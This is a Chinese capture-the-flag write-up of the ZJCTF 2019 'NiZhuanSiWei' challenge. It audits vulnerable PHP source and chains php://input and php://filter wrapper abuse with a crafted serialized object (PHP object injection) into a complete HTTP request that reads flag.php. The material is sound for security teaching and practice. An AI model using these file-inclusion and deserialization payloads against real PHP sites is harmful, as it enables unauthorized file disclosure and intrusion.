# [ZJCTF 2019]NiZhuanSiWei
TAG:PHP 源码审计 PHP伪协议  
## 解题过程：  
打开题目就发现页面源代码，进行审计获取解题信息  
![20210105114634](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105114634.png)  
```
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```
通过代码分析可知，页面通过GET获取```text```,```file```,```password```三个参数  
1. 如果```text```参数存在就打开```text```参数（文件名）指向的文件，当文件中只含有字符串```welcome to the zjctf```时输出此字符串并向下执行代码  
2. 判断```file```参数中是否存在```flag```字符串，如果存在就退出，不存在将向下运行  
3. 读取```file```参数指向的文件，并将```password```参数内容反序列化后输出  

针对```text```参数使用PHP伪协议```php://input```绕过  
![20210105171614](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105171614.png)  
针对```file```参数使用PHP伪协议```php://filter```读取文件  
![20210105172353](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105172353.png)  
将获得的base64值解码，获得```useless.php```源码  
![20210105172510](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105172510.png)  
```
<?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```
  
通过分析源码可知，此处考查PHP魔术方法与序列化，当Flag类被判别为字符串时将自动调用```__tostring()```,在```index.php```中恰好存在文件包含与``` echo $password;```,故构造:
```
<?php  
class Flag{  
    public $file='flag.php';  
}  
$a = new Flag;
echo urlencode(serialize($a));
?>  
```
执行结果为:
```O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D```  
最终的payload为:
```
POST /?text=php://input&file=useless.php&password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D   HTTP/1.1
Host: f8e0bbc3-a9da-420f-b226-34572ca8a794.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cache: no-cache
Content-Length: 20
Origin: null
DNT: 1
Connection: close

welcome to the zjctf
```
成功获取flag  
![20210105175000](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210105175000.png)  
## 题目分析  
此题考查了PHP伪协议与PHP魔术方法  
参见:[PHP伪协议利用笔记]()  